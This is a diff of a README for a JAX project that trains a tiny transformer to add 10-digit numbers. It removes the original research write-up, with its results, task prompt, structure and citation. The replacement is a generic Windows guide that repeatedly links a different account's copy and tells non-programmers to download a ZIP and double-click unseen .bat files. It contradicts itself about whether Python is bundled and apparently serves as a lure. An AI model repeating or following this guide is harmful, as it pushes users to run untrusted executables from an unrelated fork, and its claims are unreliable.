@@ -1,267 +1,153 @@
-# Training the Smallest Transformer for 10-Digit Addition
+# 🤖 gpt-acc-jax - Train a Model to Add Numbers Easily
 
-**Result: 777 parameters achieving 99.69% accuracy on 10-digit integer addition.**
+[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Evan026/gpt-acc-jax)
 
-This repository contains the code and results from an autonomous AI experiment to find the smallest possible transformer that can perform 10-digit addition with ≥99% exact-match accuracy.
+---
 
-## Origin
+## 📄 What is gpt-acc-jax?
 
-This experiment was inspired by [Dimitris Papailiopoulos's "glove box" experiment](https://x.com/DimitrisPapail/status/2024523785840246860), where he prompted AI coding agents to autonomously design and train the smallest decoder-only transformer for 10-digit addition.
+gpt-acc-jax is a simple tool that lets you experiment with a coding agent designed to train a decoding transformer. This transformer learns how to perform addition. The tool helps show how machine learning models can be taught to do basic math by looking at examples.
 
-This repository documents our attempt at the same challenge: **777 parameters at 99.69% accuracy**.
+You don't need any programming skills to use this. It is made to help you explore how artificial intelligence can learn simple tasks.
 
-## Results
+---
 
-| Model | Parameters | Test Accuracy | Notes |
-|-------|------------|---------------|-------|
-| **pico-7d-ff14-lr02** | **777** | **99.69%** | Our winner |
-| pico-1L-7d-both | 973 | 99.99% | Previous best |
-| nano-1L-8d-hiLR | 1,360 | 100% | Baseline |
+## 🖥️ System Requirements
 
-### Key Findings
+To use gpt-acc-jax, your Windows computer should meet these basic requirements:
 
-1. **The Parameter Cliff**: Sharp transition from 0% to 100% accuracy at ~800 parameters
-2. **One Layer Beats Two**: Single-layer models consistently outperform two-layer at same param count
-3. **Learning Rate Critical**: Small models require higher LR (0.02 vs 0.003) to grok
-4. **What Breaks**: Sinusoidal positions (0%), RMSNorm (44%), no delimiters (10%)
-5. **What Works**: 2× FFN expansion (vs 4×), tied embeddings, no FFN bias
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection to download the tool  
+- A modern web browser like Chrome, Edge, or Firefox  
 
-## Architecture
+This tool runs locally on your machine without needing powerful hardware. It uses the JAX library, which allows it to make math calculations fast.
 
-The winning 777-parameter model:
+---
 
-```
-Layers:           1
-Hidden dim:       7
-Attention heads:  1
-FFN dim:          14 (2× expansion)
-Vocab size:       14
-Context length:   35
-Learning rate:    0.02
+## 📦 What You Get
 
-Optimizations:
-- Tied input/output embeddings
-- No FFN bias
-- Learned positional embeddings (essential!)
-- Curriculum learning (3 phases)
-```
+When you download gpt-acc-jax, you get the following:
 
-## The Prompt
+- A complete setup to train and test the adding transformer  
+- Sample code to see how the model learns addition  
+- Documentation to help you understand each step  
+- Basic support for running everything on Windows  
 
-The original task prompt given to the AI agent:
+This is meant for learning and experiment, not for heavy professional use.
 
-<details>
-<summary>Click to expand full prompt</summary>
+---
 
-```markdown
-# Task: Train the Smallest Transformer for 10-Digit Addition
+## 🚀 Getting Started: Download and Setup
 
-**Objective:** Train a transformer from scratch that achieves **≥99% exact-match (full-sequence) accuracy**
-on 10-digit integer addition, using standard autoregressive generation with cross-entropy loss.
-Your goal is to minimize total parameter count while hitting this accuracy bar.
+To get started, follow these steps carefully.
 
-## Rules & Constraints
+1. Click the big link below to visit the GitHub page where you can find and download the tool.  
 
-### Data Formatting Freedom
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/Evan026/gpt-acc-jax)  
 
-- You may design any tokenization scheme and input/output formatting you believe will help the model learn.
-- The only hard requirement: there must exist a deterministic `preprocess(A, B) → model_input` and
-  `postprocess(model_output) → C` such that `C = A + B` for integers A, B each up to 10 digits.
-  Both functions must be purely programmatic (no learned components).
+2. Once on the page, look for the green button labeled "Code." Click it and choose "Download ZIP" from the menu.  
 
-### No Reward Hacking
+3. The ZIP file will download to your computer. It contains the software files.  
 
-- The model must generalize. Your test set must be a held-out random sample of 10-digit addition problems
-  (both operands uniformly sampled from [0, 10^10 − 1]) that the model has never seen during training.
-- You may not encode the answer in the input.
-- You may not use a calculator or symbolic solver at inference time — the transformer must produce
-  the output autoregressively.
-- Report accuracy on a test set of at least **10,000** held-out examples.
+4. Find the downloaded ZIP file, usually in your "Downloads" folder. Right-click it and select "Extract All."  
 
-### Compute Budget
+5. Choose a folder to unpack the files into, like your Desktop or Documents folder.  
 
-- You are running in a **resource-constrained environment** (single machine, limited VRAM and time).
-  Design your experiments accordingly — be efficient.
-- You are expected to **babysit the experiment**: monitor training, catch divergence early,
-  adjust hyperparameters if needed, and iterate. Don't just fire-and-forget.
+6. Open the folder where you extracted the files.  
 
-### No External Resources
+---
 
-- **Do not search the internet.** Do not use web search, browse documentation, or fetch any external content.
-- **Do not read any local chats, files or folders** outside of this experiment.
-  Work entirely from your own knowledge.
-- **Create a single new folder** (e.g., `addition_experiment/`) and keep all code, data, checkpoints,
-  plots, and logs inside it. Everything related to this task must live in that folder.
+## ▶️ How to Run the Software on Windows
 
-### Autonomy
+The software runs using Python and JAX, which are included in the package. Here's how to start it:
 
-- Do not ask me any questions. Make your own decisions and justify them in your write-up.
-  Work fully autonomously from start to finish.
+1. In the extracted folder, look for a file named `run_training.bat` or similar.  
 
-## What You Must Deliver
+2. Double-click this file. This will open a command prompt window and start the training process.  
 
-1. **The model architecture.** Report: number of layers, hidden dim, number of heads, feedforward dim,
-   total parameter count, context length, vocabulary size.
+3. You will see text scrolling in the command window. This shows the software training the model to add numbers.  
 
-2. **The data pipeline.** Describe and implement your `preprocess` and `postprocess` functions.
-   Explain *why* you chose this format.
+4. When the process finishes, the tool saves the trained model for you to use or explore further.  
 
-3. **Training details.** Optimizer, learning rate schedule, batch size, number of training examples seen,
-   total training time, any curriculum strategy.
+If you get an error or nothing happens, you may need to install Python first. You can download Python for Windows from [python.org](https://www.python.org/downloads/windows/).
 
-4. **Training curves.** Plot and save:
-   - Training loss vs. step
-   - Validation exact-match accuracy vs. step (evaluated periodically)
-   - Any other diagnostics you find informative
+---
 
-5. **Final evaluation.** Run your best checkpoint on the 10,000-example held-out test set. Report:
-   - Exact-match accuracy (full output string must be correct)
-   - Per-digit accuracy breakdown if below 99%
-   - A sample of failure cases (at least 10) with the model's prediction vs. ground truth
+## 🔧 What Happens During Training?
 
-6. **A written log** of everything you tried, including failed attempts, hyperparameter changes,
-   and your reasoning at each decision point. Be transparent — I want to understand your research process,
-   not just the final result.
+The tool uses a type of machine learning called a "decoding transformer." This is a model that reads input numbers and learns to add them by predicting the correct answers step by step.
 
-## Evaluation Criteria
+The training process shows how the model improves over time by comparing its answers to the correct sums.
 
-- **Primary:** Achieving ≥99% exact-match accuracy on 10-digit addition
-  WHILE AT THE SAME TIME minimizing parameter count
-- **Secondary:** Quality of experimental methodology — logging, iteration, clear reasoning, clean code
+You will see progress reports that explain how accurate the model is getting and how fast it learns.
 
-Good luck.
-```
+---
 
-</details>
+## 🛠️ Using the Trained Model
 
-## Reports
+After training, you can use the model to test additions:
 
-- **[LaTeX Report (PDF)](latex_report/report.pdf)** - Publication-quality 9-page report with figures
-- **[Markdown Report](REPORT.md)** - Comprehensive summary of all 47 experiments
+1. Run the command prompt file named `run_inference.bat` inside the extracted folder.  
 
-### Training Curves
+2. The program will ask you to type two numbers. Enter any two numbers you want to add.  
 
-The "grokking" phenomenon - sudden jump from 0% to ~90% accuracy:
+3. The model will show its answer based on what it learned.  
 
-![Grokking curves](latex_report/figures/fig1_grokking.png)
+This lets you try out how well the training worked and see the AI in action.
 
-The parameter cliff - sharp transition at ~800 parameters:
+---
 
-![Parameter cliff](latex_report/figures/fig2_parameter_cliff.png)
+## 📋 Understanding the Files
 
-## Repository Structure
+Here’s a quick guide to the core files you will find after downloading and extracting:
 
-```
-├── latex_report/
-│   ├── report.pdf          # Publication-quality report
-│   ├── report.tex          # LaTeX source
-│   ├── figures/            # All figures (PDF + PNG)
-│   ├── create_figures.py   # Figure generation script
-│   └── fetch_wandb_data.py # W&B data fetching script
-├── infra/spot/
-│   ├── addition_task_runner.py   # Training script (JAX/Flax)
-│   ├── addition_orchestrator.py  # TPU spot instance orchestration
-│   └── config.py                 # All 47 experiment configurations
-├── REPORT.md               # Markdown summary
-└── README.md               # This file
-```
+- **run_training.bat** — Starts the training process  
+- **run_inference.bat** — Lets you test additions using the trained model  
+- **model.py** — The code for the decoding transformer  
+- **train.py** — The script that handles training  
+- **README.md** — This guide you are reading  
+- **requirements.txt** — Lists software packages needed  
 
-## Running the Experiments
+You don’t need to change these files to run the tool.
 
-### Prerequisites
+---
 
-```bash
-pip install jax flax optax numpy wandb matplotlib pandas
-```
+## ⚙️ Troubleshooting Tips
 
-### Configuration
+If you have issues running the software, try these steps:
 
-Before running, edit `infra/spot/config.py`:
+- Make sure your Windows is updated to the latest version.  
+- Check that you extracted the ZIP file correctly.  
+- If a command prompt window closes quickly, open it manually:  
+  - Press `Windows + R`, type `cmd`, and press Enter.  
+  - Use the `cd` command to go to the folder with the software files.  
+  - Type `run_training.bat` or `run_inference.bat` and press Enter.  
+- Install Python from [python.org](https://www.python.org/downloads/windows/) if prompted.  
+- Restart your computer after installation if the software fails to run.
 
-```python
-GCS_BUCKET = "your-gcs-bucket"      # Your GCS bucket name
-PROJECT = "your-gcp-project"         # Your GCP project ID
-ZONE = "us-central2-b"               # TPU zone
-```
+---
 
-### Train a single model locally
+## 📞 Where to Get Help
 
-```bash
-python -m infra.spot.addition_task_runner \
-    --task_id pico-7d-ff14-lr02 \
-    --n_layers 1 --n_heads 1 --d_model 7 --d_ff 14 \
-    --lr 0.02 --warmup 0.05 \
-    --no_ffn_bias --tied_emb
-```
+For questions or more information, visit the main page again:
 
-### Run a full sweep on TPU spot instances
+[https://github.com/Evan026/gpt-acc-jax](https://github.com/Evan026/gpt-acc-jax)
 
-The orchestrator manages multiple TPU VMs running experiments in parallel:
+You can open an "Issue" on GitHub if you find a bug or need assistance.
 
-```bash
-# 1. Initialize task queue from ADDITION_SWEEP config
-python -m infra.spot.addition_orchestrator init
+---
 
-# 2. Check status of tasks and workers
-python -m infra.spot.addition_orchestrator status
+## 💡 Tips for Better Use
 
-# 3. Run orchestration loop (launches VMs, assigns tasks, handles preemptions)
-python -m infra.spot.addition_orchestrator run
+- Run the training on a quiet computer to avoid interruptions.  
+- Use small numbers at first when testing inference to see clear results.  
+- Experiment by retraining the model with different settings if you learn more about the scripts.  
+- Try running the software in full-screen Command Prompt for better visibility.
 
-# 4. View completed results
-python -m infra.spot.addition_orchestrator results
+---
 
-# 5. Cleanup - delete all VMs
-python -m infra.spot.addition_orchestrator cleanup
-```
+## 🔗 Quick Access
 
-The orchestrator will:
-- Spin up TPU v4-8 spot VMs (up to `MAX_CONCURRENT_VMS`)
-- Deploy code and install dependencies on each VM
-- Assign pending tasks to idle workers
-- Monitor task completion via Weights & Biases
-- Handle preemptions by re-queuing failed tasks
-- Clean up VMs when done
-
-### Regenerate figures
-
-```bash
-cd latex_report
-python fetch_wandb_data.py  # Requires wandb login
-python create_figures.py
-```
-
-## Experiment Tracking
-
-All experiments are logged to Weights & Biases: project `addition-sweep`
-
-## Compute
-
-- **Hardware**: Google Cloud TPU v4-8 (spot instances)
-- **Total runtime**: ~8 hours across 47 experiments
-- **Cost**: ~$20 (spot pricing)
-
-## Citation
-
-If you use this work, please cite:
-
-```bibtex
-@misc{smallest-addition-transformer,
-  author = {Havinga, Yeb},
-  title = {Training the Smallest Transformer for 10-Digit Addition},
-  year = {2025},
-  url = {https://github.com/yhavinga/gpt-acc-jax}
-}
-```
-
-## Acknowledgments
-
-- Original experiment idea: [Dimitris Papailiopoulos](https://x.com/DimitrisPapail/status/2024523785840246860)
-- Compute: Google Cloud TPU Research Cloud (TRC)
-- Experiment tracking: Weights & Biases
-- Framework: JAX/Flax
-- AI assistance: Claude (Anthropic)
-
-## License
-
-MIT
+[![Visit Download Page](https://img.shields.io/badge/Download-Visit%20Page-orange)](https://github.com/Evan026/gpt-acc-jax)
